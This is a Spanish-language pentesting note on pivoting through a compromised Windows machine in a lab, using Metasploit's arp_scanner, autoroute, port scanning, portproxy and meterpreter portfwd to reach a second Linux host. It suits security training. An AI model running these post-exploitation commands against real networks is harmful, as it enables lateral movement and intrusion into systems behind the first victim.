---
title: "Pivoting Entornos Windows"
layout: "single"
category: "Pivoting"
slug: "pivoting/pivoting-entornos-windows"
date: "2025-09-30"
---

### Metasploit
Teniendo el siguiente laboratorio, queremos llegar a lanzar un escaneo a la máquina línux, previamente comprometiendo y utilizando la máquinas windows como "puente".

Partimos de que hemos comprometido la primera máquina (Windows), y tenemos establecida con ella una sesión de *meterpreter*.

| Int red |  Kali Linux  |      Windows |       Linux |
| :------ | :----------: | -----------: | ----------: |
| Eth0    | 192.168.1.20 | 192.168.1.40 | 10.10.10.30 |
| Eth1    |              |  10.10.10.23 |             |

En caso de tener comprometida la máquina pero no tengamos una sesión de meterpreter, lo ideal es generar un payload con msfvenom, compartirlo con la máquina y lanzarlo (mientras estamos a la escucha con metasploit).
![[Metasploit y MsfVenom#Payload sesión meterpreter Windows]]

### 1º - Identificar la segunda máquina víctima
```bash
### IDENTIFICAR LOS ADAPTADORES DE RED DE LA WINDOWS
ipconfig

### MANDAR LA SESIÓN AL SEGUNDO PLANO
Ctrl + Z

### IDENTIFICAR IP DEL LINUX
use windows/gather/arp_scanner
# RHOSTS (IP y máscara de la interfaz sobre la que queremos pivotar)
Ejemplo: set RHOSTS 10.10.10.23/24
# SESSIONS (La sesión que dejamos en background anteriormente)
set SESSION 1
run
```

### 2º - Enrutar trafico
Teniendo los datos anteriores (ip y máscara de la 2ª víctima), ejecutamos el autoroute y le decimos la sesión sobre la que queremos enrutar el tráfico

```bash
use multi/manage/autoroute
set SESSION 1
```

### 3º - Port Forwarding
Ya tenemos el tráfico enrutado y estariamos listos para comprometer la segunda máquina. Podemos lanzar un breve escaneo para luego ver que puerto haremos *port forwarding*.
```bash
# Primero identificamos los puertos abiertos "rapidamente"
use scanner/portscan/tcp

# luego hacemos un escaneo de vulnerabilidades y ya por ultimo el port forwarding para un gran escaneo. sino no funciona bien, no mestra los detalles y es extremadamente lento
db_nmap -p <puertos> -sV <IP>
```

#### OPCION 1
```bash
use windows/manage/portproxy
###OPCIONES NECESARIAS
CONNECT_ADDRESS <IP víctima> # en este caso 10.10.10.30
CONNECT_PORT <Puerto> # El puerto que nos interese traernos
LOCAL_ADDRESS 0.0.0.0
LOCAL_PORT <Puerto local> # Puerto local al que queramos traernos el CONNECT_PORT
SESSION #Sesion de meterpreter en la que tenemos al windows comprometido
```

#### OPCION 2 (MAS SENCILLA)

```bash
### elegir la sesion que nos interesa
sessions -l (para listar la sesion)
session -i <num_sesion>

### reenvio de puerto
portfwd add -l <puerto_atacante> -p <puerto_victima_remoto> -r <ip_victima>

```


Una vez realizado, supongamos que nos hemos traído el puerto 80 de Linux al 5000. Podemos por ejemplo abrir un navegador y poner: 
http://192.168.1.40:5000 (Es decir la IP del windows y el puerto elegido).


